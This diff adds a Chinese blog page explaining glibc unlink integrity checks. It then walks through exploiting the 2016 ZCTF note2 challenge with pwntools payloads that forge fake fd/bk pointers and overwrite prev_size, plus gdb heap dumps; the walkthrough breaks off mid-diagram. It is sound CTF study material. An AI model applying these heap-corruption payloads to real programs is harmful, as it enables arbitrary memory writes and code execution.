@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="7and">
+  <meta name="keywords" content="">
+  <title>unlink中的验证机制归纳总结 - 7又7分之一节拍&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>7and</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+                unlink中的验证机制归纳总结
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-07-09 10:34">
+      2020年7月9日 上午
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      46
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <h1 id="unlink中的验证机制归纳总结"><a href="#unlink中的验证机制归纳总结" class="headerlink" title="unlink中的验证机制归纳总结"></a>unlink中的验证机制归纳总结</h1><p>以下内容忽略了top chunk以及其他的诸多验证，默认unlink的是一个small chunk。</p>
+<p>事实上，unlink中的验证机制一部分来自于free函数，一部分则来自于unlink宏函数。</p>
+<h2 id="来自free-的验证机制"><a href="#来自free-的验证机制" class="headerlink" title="来自free()的验证机制"></a>来自free()的验证机制</h2><pre><code class="hljs c"><span class="hljs-keyword">if</span> (builtin_expect (!prev_inuse(nextchunk), <span class="hljs-number">0</span>))
+&#123;
+	errstr = <span class="hljs-string">"double free or corruption (!prev)"</span>;
+	<span class="hljs-keyword">goto</span> errout;
+&#125;</code></pre>
+
+<p>如果当前free 的chunk 的下一个相邻chunk 的size 中标志位没有标识当前free chunk为inuse 状态，报错。</p>
+<pre><code class="hljs c">nextsize = chunksize(nextchunk);
+<span class="hljs-keyword">if</span> (__builtin_expect (nextchunk-&gt;<span class="hljs-built_in">size</span> &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)
+	|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))
+&#123;
+	errstr = <span class="hljs-string">"free(): invalid next size (normal)"</span>;
+	<span class="hljs-keyword">goto</span> errout;
+&#125;</code></pre>
+
+<p>计算当前free 的chunk 的下一个相邻chunk 的大小，该大小如果小于等于2*SIZE_SZ 或是大于了分配区所分配区的内存总量，报错。</p>
+<h2 id="来自unlink-的验证机制"><a href="#来自unlink-的验证机制" class="headerlink" title="来自unlink()的验证机制"></a>来自unlink()的验证机制</h2><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \
+      malloc_printerr (<span class="hljs-string">"corrupted size vs. prev_size"</span>);               \</code></pre>
+
+<p>判断chunk p的大小，是否与下一个chunk 的prev_size相等</p>
+<p><strong>注意next_chunk的算法，算的是直接物理上与它相邻。</strong></p>
+<pre><code class="hljs c">FD = P-&gt;fd;                                   \
+BK = P-&gt;bk;                                   \
+<span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))             \
+      malloc_printerr (<span class="hljs-string">"corrupted double-linked list"</span>);               \</code></pre>
+
+<p>接着，让FD指向p的下一个chunk，BK指向p的上一个chunk，验证FD的bd以及BK的fd。这是最关键的部分。</p>
+<h2 id="unlink的步骤"><a href="#unlink的步骤" class="headerlink" title="unlink的步骤"></a>unlink的步骤</h2><h3 id="向低地址合并"><a href="#向低地址合并" class="headerlink" title="向低地址合并"></a>向低地址合并</h3><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span>
+<span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;
+	prevsize = p-&gt;prev_size;
+	<span class="hljs-built_in">size</span> += prevsize;
+	p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));
+	unlink(p, bck, fwd);
+&#125;</code></pre>
+
+<p>如果当前free 的chunk 的前一个相邻chunk 为空闲状态，与前一个空闲chunk 合并。计算合并后的chunk 大小，并将前一个相邻空闲chunk 从空闲chunk 链表中删除。</p>
+<p><strong>注意：</strong>在unlink时不会传自身prevsize给unlink函数！这在伪造堆时十分重要！<strong>意味着被unlink的chunk大小可以与prevsize不相等！</strong></p>
+<p>某chunk的前一个chunk是由prev_size计算出来的，而前一个chunk的计算自身后一个chunk时，是用自身的大小计算的。</p>
+<p><strong>这意味着，某chunk的前一个chunk的后一个chunk可以不是某chunk。</strong></p>
+<h3 id="向高地址合并"><a href="#向高地址合并" class="headerlink" title="向高地址合并"></a>向高地址合并</h3><pre><code class="hljs c"><span class="hljs-comment">/* consolidate forward */</span>
+<span class="hljs-keyword">if</span> (!nextinuse) &#123;
+	unlink(nextchunk, bck, fwd);
+	<span class="hljs-built_in">size</span> += nextsize;
+&#125; <span class="hljs-keyword">else</span>
+	clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);</code></pre>
+
+<p>如果与当前free 的chunk 相邻的下一个chunk 处于inuse 状态，清除当前chunk 的inuse状态，则当前chunk 空闲了。否则，将相邻的下一个空闲chunk 从空闲链表中删除，并计算当前chunk 与下一个chunk 合并后的chunk 大小。</p>
+<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>后向合并（合并低地址）实际上检测的是<strong>当前chunk</strong>的prev_inuse位是否为1；</p>
+<p>前向合并（合并高地址）实际上检测的是<strong>下下个chunk</strong>的prev_inuse位是否为1。</p>
+<p>后向合并先合并再unlink，前向合并先unlink再合并。</p>
+<h2 id="unlink原理及其现利用方式"><a href="#unlink原理及其现利用方式" class="headerlink" title="unlink原理及其现利用方式"></a>unlink原理及其现利用方式</h2><p>在本节内容中，我将先介绍目前unlink的利用原理和效果，接着进行总结，之后将用一个例子来实践unlink的利用。</p>
+<p>unlink的利用中，最重要的便是处理<code>FD-&gt;bk != P || BK-&gt;fd != P</code>这一逻辑。</p>
+<p>不妨先看一看正常情况下的unlink。</p>
+<img src="unlink中的验证机制归纳总结.assets/image-20200415092437231.png" srcset="/img/loading.gif" alt="image-20200415092437231" style="zoom:80%;" />
+
+<p>在这张图片中，x，y两者应该为在物理上与ptr相隔较远。有一个arr数组，一项存放了ptr的地址。</p>
+<p><strong>注意：ptr本身一定是不包含ptr的地址的！不要搞混淆了！</strong></p>
+<p>事实上，bk的计算实则为<code>&amp;(x+3*size_sz)</code>，fd的计算实则为<code>&amp;(y+2*size_sz)</code></p>
+<p>如果我们将fd和bk所指改为下图这样：</p>
+<img src="unlink中的验证机制归纳总结.assets/image-20200415092940304.png" srcset="/img/loading.gif" alt="image-20200415092940304" style="zoom:80%;" />
+
+<p>同样可以满足验证，来看看接下来会发生什么。</p>
+<pre><code class="hljs c">FD-&gt;bk = BK;                                  \
+BK-&gt;fd = FD;                                  \</code></pre>
+
+<p>正常情况下：</p>
+<img src="unlink中的验证机制归纳总结.assets/image-20200415094025429.png" srcset="/img/loading.gif" alt="image-20200415094025429" style="zoom:80%;" />
+
+<p>而如果是我们修改过的情况：第一步：</p>
+<img src="unlink中的验证机制归纳总结.assets/image-20200415093715542.png" srcset="/img/loading.gif" alt="image-20200415093715542" style="zoom:80%;" />
+
+<p>第二步：</p>
+<img src="unlink中的验证机制归纳总结.assets/image-20200415094141338.png" srcset="/img/loading.gif" alt="image-20200415094141338" style="zoom:80%;" />
+
+<p>可以看到，原本存放p的地址的地方变成了自身地址减3*size_sz，</p>
+<p>了解了这个，但也要不要忘了什么时候触发unlink。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p><strong>核心：修改被 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针。</strong></p>
+<h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p>这是最易想到的利用方式，修改fd，bk后，触发前向合并或后向合并，进而触发unlink。</p>
+<h4 id="伪造堆-溢出"><a href="#伪造堆-溢出" class="headerlink" title="伪造堆+溢出"></a>伪造堆+溢出</h4><p>若想伪造堆，相比UAF需要多伪造prev_size的内容，这是来自unlink函数的检验，具体内容请回顾前面内容。</p>
+<p><strong>请仔细看向低地址合并中写的内容！</strong></p>
+<p><strong>然而，可以想到这样一个矛盾：</strong></p>
+<p>在堆内伪造的虚假chunk大小一定不同于触发合并的chunk的prev_size位，若想相同，则又丧失了fd，bk的控制，需要UAF了，故伪造堆还需要伴随着堆溢出才能继续进行。</p>
+<h2 id="附：前向overlapping中的unlink"><a href="#附：前向overlapping中的unlink" class="headerlink" title="附：前向overlapping中的unlink"></a>附：前向overlapping中的unlink</h2><p>hctf 2018.</p>
+<p>事实上，前向overlappping的关键点不在于unlink。但为了加深对unlink的理解，在这里写一遍。</p>
+<p>前向overlapping的利用过程和伪造堆有着异曲同工之处，可以理解为prev_size并不一定是前一个chunk的大小，它实际上是提供了一个寻找的偏移。</p>
+<p>前向overlappping常由off by one引发，以以下堆为例：</p>
+<p><strong>假设堆是用calloc分配的，或有同样操作会清空堆。</strong></p>
+<pre><code class="hljs c">+-----------+
+|     <span class="hljs-number">1</span>     |  small bin <span class="hljs-number">128</span>
++-----------+
+|     <span class="hljs-number">2</span>     |  fastbin  <span class="hljs-number">96</span>
++-----------+
+|     <span class="hljs-number">3</span>     |  fastbin <span class="hljs-number">96</span>
++-----------+
+|     <span class="hljs-number">4</span>     |  smallbin <span class="hljs-number">240</span>
++-----------+</code></pre>
+
+<p>首先释放chunk 1，它先将被放入unsorted bin中，</p>
+<p>释放chunk3，被放入fast bin中。</p>
+<p>malloc 104字节的chunk，将使用chunk3的位置，若有off by one则可同时改prev_size 和prev inuse.</p>
+<p>改prev size偏移到chunk 1 ，修改后释放chunk4，</p>
+<p><strong>chunk1变为了一个大chunk，大小为前三个chunk之和</strong></p>
+<p>（若不清空堆，下一步直接得libc地址，并fastbin attack改malloc hook到one_gadgets，之后malloc或free错误堆块abort得shell）</p>
+<p>此时malloc <strong>原chunk1大小</strong>（因为会清零内容，分大了也没有用，分小了libc地址不会落入chunk2中去）的chunk，glibc将会去切割这个small chunk，</p>
+<p>接着展示chunk2，注意是chunk2的内容即可获得libc地址。之后灵活切割堆，fastbin attack即可。</p>
+<p><strong>在这个过程中，chunk 1 本来就是free函数释放的，fd，bd存的是双向链表的地址，下一个chunk的pv，pu位当然也是正确的，自然能通过校验。</strong></p>
+<p>若用strcpy从后往前写，相当于p64(0x100).</p>
+<h1 id="实例——来自ctf-wiki"><a href="#实例——来自ctf-wiki" class="headerlink" title="实例——来自ctf-wiki"></a>实例——来自ctf-wiki</h1><p>本实例来自ctf-wiki，我做了修改以及补充。</p>
+<h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先，我们先分析一下程序，可以看出程序的主要功能为</p>
+<ul>
+<li>添加note，size限制为0x80，size会被记录，note指针会被记录。</li>
+<li>展示note内容。</li>
+<li>编辑note内容，其中包括覆盖已有的note，在已有的note后面添加内容。</li>
+<li>释放note。</li>
+</ul>
+<p>仔细分析后，可以发现程序有以下几个问题</p>
+<ol>
+<li>在添加note时，程序会记录note对应的大小，该大小会用于控制读取note的内容，但是读取的循环变量i是无符号变量，所以比较时都会转换为无符号变量，那么当我们输入size为0时，glibc根据其规定，会分配0x20个字节，但是程序读取的内容却并不受到限制，故而会产生<strong>堆溢出</strong>。</li>
+<li>程序在每次编辑note时，都会申请0xa0大小的内存，但是在 free 之后并没有设置为NULL。</li>
+</ol>
+<p>第一个问题对应在ida中的代码如下</p>
+<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 __fastcall <span class="hljs-title">ReadLenChar</span><span class="hljs-params">(__int64 a1, __int64 a2, <span class="hljs-keyword">char</span> a3)</span></span>
+<span class="hljs-function"></span>&#123;
+  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// [sp+Ch] [bp-34h]@1</span>
+  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [sp+2Fh] [bp-11h]@2</span>
+  <span class="hljs-keyword">unsigned</span> __int64 i; <span class="hljs-comment">// [sp+30h] [bp-10h]@1</span>
+  __int64 v7; <span class="hljs-comment">// [sp+38h] [bp-8h]@2</span>
+
+  v4 = a3;
+  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0L</span>L; a2 - <span class="hljs-number">1</span> &gt; i; ++i )
+  &#123;
+    v7 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1u</span>LL);
+    <span class="hljs-keyword">if</span> ( v7 &lt;= <span class="hljs-number">0</span> )
+      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+    <span class="hljs-keyword">if</span> ( buf == v4 )
+      <span class="hljs-keyword">break</span>;
+    *(_BYTE *)(i + a1) = buf;
+  &#125;
+  *(_BYTE *)(a1 + i) = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">return</span> i;
+&#125;</code></pre>
+
+<p>其中i是unsigned类型，a2为int类型，所以两者在for循环相比较的时候，a2-1的结果-1会被视为unsigned类型，此时，即最大的整数。所以说可以读取任意长度的数据，这里也就是后面我们溢出所使用的办法。</p>
+<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>这里我们主要利用发现的第一个问题，主要利用了 fastbin 的机制、unlink 的机制。</p>
+<p>下面依次进行讲解。</p>
+<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>首先，我们先把note可能的基本操作列举出来。</p>
+<pre><code class="hljs python">p = process(<span class="hljs-string">'./note2'</span>)
+note2 = ELF(<span class="hljs-string">'./note2'</span>)
+libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)
+context.log_level = <span class="hljs-string">'debug'</span>
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">newnote</span><span class="hljs-params">(length, content)</span>:</span>
+    p.recvuntil(<span class="hljs-string">'option---&gt;&gt;'</span>)
+    p.sendline(<span class="hljs-string">'1'</span>)
+    p.recvuntil(<span class="hljs-string">'(less than 128)'</span>)
+    p.sendline(str(length))
+    p.recvuntil(<span class="hljs-string">'content:'</span>)
+    p.sendline(content)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shownote</span><span class="hljs-params">(id)</span>:</span>
+    p.recvuntil(<span class="hljs-string">'option---&gt;&gt;'</span>)
+    p.sendline(<span class="hljs-string">'2'</span>)
+    p.recvuntil(<span class="hljs-string">'note:'</span>)
+    p.sendline(str(id))
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">editnote</span><span class="hljs-params">(id, choice, s)</span>:</span>
+    p.recvuntil(<span class="hljs-string">'option---&gt;&gt;'</span>)
+    p.sendline(<span class="hljs-string">'3'</span>)
+    p.recvuntil(<span class="hljs-string">'note:'</span>)
+    p.sendline(str(id))
+    p.recvuntil(<span class="hljs-string">'2.append]'</span>)
+    p.sendline(str(choice))
+    p.sendline(s)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deletenote</span><span class="hljs-params">(id)</span>:</span>
+    p.recvuntil(<span class="hljs-string">'option---&gt;&gt;'</span>)
+    p.sendline(<span class="hljs-string">'4'</span>)
+    p.recvuntil(<span class="hljs-string">'note:'</span>)
+    p.sendline(str(id))</code></pre>
+
+<h4 id="生成三个note"><a href="#生成三个note" class="headerlink" title="生成三个note"></a>生成三个note</h4><p>构造三个 chunk，chunk0、chunk1 和 chunk2</p>
+<pre><code class="hljs python"><span class="hljs-comment"># chunk0: a fake chunk</span>
+ptr = <span class="hljs-number">0x0000000000602120</span>  <span class="hljs-comment">#=&gt;存储每个note内容的地址</span>
+                          <span class="hljs-comment">#最终效果：这个指针指向的数据即note[0]的char *被修改了</span>
+fakefd = ptr - <span class="hljs-number">0x18</span>
+fakebk = ptr - <span class="hljs-number">0x10</span>
+content = <span class="hljs-string">'a'</span> * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0x61</span>) + p64(fakefd) + p64(fakebk) + <span class="hljs-string">'b'</span> * <span class="hljs-number">64</span> + p64(<span class="hljs-number">0x60</span>)
+<span class="hljs-comment">#         prv_data    size          fd             bk</span>
+<span class="hljs-comment">#content = p64(fakefd) + p64(fakebk)</span>
+newnote(<span class="hljs-number">128</span>, content)
+<span class="hljs-comment"># chunk1: a zero size chunk produce overwrite</span>
+newnote(<span class="hljs-number">0</span>, <span class="hljs-string">'a'</span> * <span class="hljs-number">8</span>)
+<span class="hljs-comment"># chunk2: a chunk to be overwrited and freed</span>
+newnote(<span class="hljs-number">0x80</span>, <span class="hljs-string">'b'</span> * <span class="hljs-number">16</span>)</code></pre>
+
+<p>其中这三个 chunk 申请时的大小分别为0x80，0，0x80，chunk1 虽然申请的大小为0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段(prev_size,size,fd,bk)，所以会分配 0x20 的空间。同时，由于无符号整数的比较问题，可以为该note输入任意长的字符串。</p>
+<pre><code class="hljs asm">0x15f0000:	0x0000000000000000	0x0000000000000091
+0x15f0010:	0x6161616161616161	0x0000000000000061
+0x15f0020:	0x0000000000602108	0x0000000000602110
+0x15f0030:	0x6262626262626262	0x6262626262626262
+0x15f0040:	0x6262626262626262	0x6262626262626262
+0x15f0050:	0x6262626262626262	0x6262626262626262
+0x15f0060:	0x6262626262626262	0x6262626262626262
+0x15f0070:	0x0000000000000060	0x0000000000000000
+0x15f0080:	0x0000000000000000	0x0000000000000000
+0x15f0090:	0x0000000000000000	0x0000000000000021
+0x15f00a0:	0x6161616161616161	0x0000000000000000
+0x15f00b0:	0x0000000000000000	0x0000000000000091
+0x15f00c0:	0x6262626262626262	0x6262626262626262
+0x15f00d0:	0x0000000000000000	0x0000000000000000
+0x15f00e0:	0x0000000000000000	0x0000000000000000
+0x15f00f0:	0x0000000000000000	0x0000000000000000
+0x15f0100:	0x0000000000000000	0x0000000000000000
+0x15f0110:	0x0000000000000000	0x0000000000000000
+0x15f0120:	0x0000000000000000	0x0000000000000000
+0x15f0130:	0x0000000000000000	0x0000000000000000
+0x15f0140:	0x0000000000000000	0x0000000000020ec1</code></pre>
+
+<p>这里需要注意的是，chunk0 中一共构造了两个 chunk</p>
+<ul>
+<li>chunk ptr[0]，这个是为了 unlink 时修改对应的值。</li>
+<li>chunk ptr[0]’s nextchunk，这个是为了使得 unlink 时的第一个检查满足。</li>
+</ul>
+<pre><code class="hljs c"><span class="hljs-comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span>
+<span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \
+  malloc_printerr (<span class="hljs-string">"corrupted size vs. prev_size"</span>);			      \</code></pre>
+
+<p>当构造完三个 note 后，堆的基本构造如图1所示。</p>
+<p><strong>思考：为了绕过检测，需要注意哪几点？</strong></p>
+<p><strong>fast chunk 和最后一个chunk的作用是什么呢？</strong></p>
+<pre><code class="hljs c">                                   +-----------------+ high addr
+                                   |      ...        |
+                                   +-----------------+
+                                   |      <span class="hljs-string">'b'</span>*<span class="hljs-number">8</span>      |
+                ptr[<span class="hljs-number">2</span>]-----------&gt; +-----------------+
+                                   |    <span class="hljs-built_in">size</span>=<span class="hljs-number">0x91</span>    |
+                                   +-----------------+
+                                   |    prevsize     |
+                                   +-----------------|------------
+                                   |    unused       |
+                                   +-----------------+
+                                   |    <span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>        |
+                 ptr[<span class="hljs-number">1</span>]----------&gt; +-----------------+  chunk <span class="hljs-number">1</span>
+                                   |    <span class="hljs-built_in">size</span>=<span class="hljs-number">0x21</span>    | 
+                                   +-----------------+
+                                   |    prevsize     |
+                                   +-----------------|-------------
+                                   |    unused       |
+                                   +-----------------+
+                                   |  prev_size=<span class="hljs-number">0x60</span> |	
+fake ptr[<span class="hljs-number">0</span>] chunk<span class="hljs-number">'</span>s nextchunk-----&gt;+-----------------+
+                                   |    <span class="hljs-number">64</span>*<span class="hljs-string">'a'</span>       |
+                                   +-----------------+
+                                   |    fakebk       |
+                                   +-----------------+
+                                   |    fakefd       |
+                                   +-----------------+
+                                   |     <span class="hljs-number">0x61</span>        |  chunk <span class="hljs-number">0</span> &lt;=一个假的freed chunk
+                                   +-----------------+
+                                   |    'a *8        |
+                 ptr[<span class="hljs-number">0</span>]----------&gt; +-----------------+
+                                   |    <span class="hljs-built_in">size</span>=<span class="hljs-number">0x91</span>    |
+                                   +-----------------+
+                                   |    prev_size    |
+                                   +-----------------+  low addr
+                                           图<span class="hljs-number">1</span></code></pre>
+
+<h4 id="释放-chunk1-覆盖-chunk2-释放-chunk2"><a href="#释放-chunk1-覆盖-chunk2-释放-chunk2" class="headerlink" title="释放 chunk1-覆盖 chunk2-释放 chunk2"></a>释放 chunk1-覆盖 chunk2-释放 chunk2</h4><p>对应的代码如下</p>
+<pre><code class="hljs python"><span class="hljs-comment"># edit the chunk1 to overwrite the chunk2</span>
+deletenote(<span class="hljs-number">1</span>)
+content = <span class="hljs-string">'a'</span> * <span class="hljs-number">16</span> + p64(<span class="hljs-number">0xa0</span>) + p64(<span class="hljs-number">0x90</span>)
+newnote(<span class="hljs-number">0</span>, content)
+<span class="hljs-comment"># delete note 2 to trigger the unlink</span>
+<span class="hljs-comment"># after unlink, ptr[0] = ptr - 0x18</span>
+deletenote(<span class="hljs-number">2</span>)</code></pre>
+
+<p>释放第一个后</p>
+<pre><code class="hljs asm">0x15f0000:	0x0000000000000000	0x0000000000000091
+0x15f0010:	0x6161616161616161	0x0000000000000061
+0x15f0020:	0x0000000000602108	0x0000000000602110
+0x15f0030:	0x6262626262626262	0x6262626262626262
+0x15f0040:	0x6262626262626262	0x6262626262626262
+0x15f0050:	0x6262626262626262	0x6262626262626262
+0x15f0060:	0x6262626262626262	0x6262626262626262
+0x15f0070:	0x0000000000000060	0x0000000000000000
+0x15f0080:	0x0000000000000000	0x0000000000000000
+0x15f0090:	0x0000000000000000	0x0000000000000021
+0x15f00a0:	0x0000000000000000	0x0000000000000000
+0x15f00b0:	0x0000000000000000	0x0000000000000091
+0x15f00c0:	0x6262626262626262	0x6262626262626262
+0x15f00d0:	0x0000000000000000	0x0000000000000000
+0x15f00e0:	0x0000000000000000	0x0000000000000000
+0x15f00f0:	0x0000000000000000	0x0000000000000000
+0x15f0100:	0x0000000000000000	0x0000000000000000
+0x15f0110:	0x0000000000000000	0x0000000000000000
+0x15f0120:	0x0000000000000000	0x0000000000000000
+0x15f0130:	0x0000000000000000	0x0000000000000000
+0x15f0140:	0x0000000000000000	0x0000000000020ec1</code></pre>
+
+<p>添加后</p>
+<pre><code class="hljs asm">0x15f0000:	0x0000000000000000	0x0000000000000091
+0x15f0010:	0x6161616161616161	0x0000000000000061 
+0x15f0020:	0x0000000000602108	0x0000000000602110 
+0x15f0030:	0x6262626262626262	0x6262626262626262
+0x15f0040:	0x6262626262626262	0x6262626262626262
+0x15f0050:	0x6262626262626262	0x6262626262626262
+0x15f0060:	0x6262626262626262	0x6262626262626262
+0x15f0070:	0x0000000000000060	0x0000000000000000 #prev_size 0x60满足验证
+0x15f0080:	0x0000000000000000	0x0000000000000000 
+0x15f0090:	0x0000000000000000	0x0000000000000021 
+0x15f00a0:	0x6161616161616161	0x6161616161616161 
+0x15f00b0:	0x00000000000000a0	0x0000000000000090 #溢出prev_inuse位为0，说明前一个没有被使用
+0x15f00c0:	0x6262626262626200	0x6262626262626262 #通过0xa0计算前一个chunk的位置
+0x15f00d0:	0x0000000000000000	0x0000000000000000
+0x15f00e0:	0x0000000000000000	0x0000000000000000
+0x15f00f0:	0x0000000000000000	0x0000000000000000
+0x15f0100:	0x0000000000000000	0x0000000000000000
+0x15f0110:	0x0000000000000000	0x0000000000000000
+0x15f0120:	0x0000000000000000	0x0000000000000000
+0x15f0130:	0x0000000000000000	0x0000000000000000
+0x15f0140:	0x0000000000000000	0x0000000000020ec1</code></pre>
+
+<p>再一次删除</p>
+<pre><code class="hljs asm">0x15f0000:	0x0000000000000000	0x0000000000000091
+0x15f0010:	0x6161616161616161	0x0000000000020ff1 #这个被改成的值，暂时不研究它
+0x15f0020:	0x0000000000602108	0x0000000000602110 #满足了验证条件 即*0x602120为0x15f0010
+0x15f0030:	0x6262626262626262	0x6262626262626262
+0x15f0040:	0x6262626262626262	0x6262626262626262
+0x15f0050:	0x6262626262626262	0x6262626262626262
+0x15f0060:	0x6262626262626262	0x6262626262626262
+0x15f0070:	0x0000000000000060	0x0000000000000000
+0x15f0080:	0x0000000000000000	0x0000000000000000
+0x15f0090:	0x0000000000000000	0x0000000000000021
+0x15f00a0:	0x6161616161616161	0x6161616161616161
+0x15f00b0:	0x00000000000000a0	0x0000000000000090
+0x15f00c0:	0x6262626262626200	0x6262626262626262
+0x15f00d0:	0x0000000000000000	0x0000000000000000
+0x15f00e0:	0x0000000000000000	0x0000000000000000
+0x15f00f0:	0x0000000000000000	0x0000000000000000
+0x15f0100:	0x0000000000000000	0x0000000000000000
+0x15f0110:	0x0000000000000000	0x0000000000000000
+0x15f0120:	0x0000000000000000	0x0000000000000000
+0x15f0130:	0x0000000000000000	0x0000000000000000
+0x15f0140:	0x0000000000000000	0x0000000000020ec1</code></pre>
+
+<p>首先释放 chunk1，由于该chunk属于fastbin，所以下次在申请的时候仍然会申请到该chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖chunk2，覆盖之后如图2所示。</p>
+<p><strong>问题：为什么不在开头就申请一个长度为0的note？然后edit note？</strong></p>
+<pre><code class="hljs c">                                   +-----------------+high addr
+                                   |      ...        |
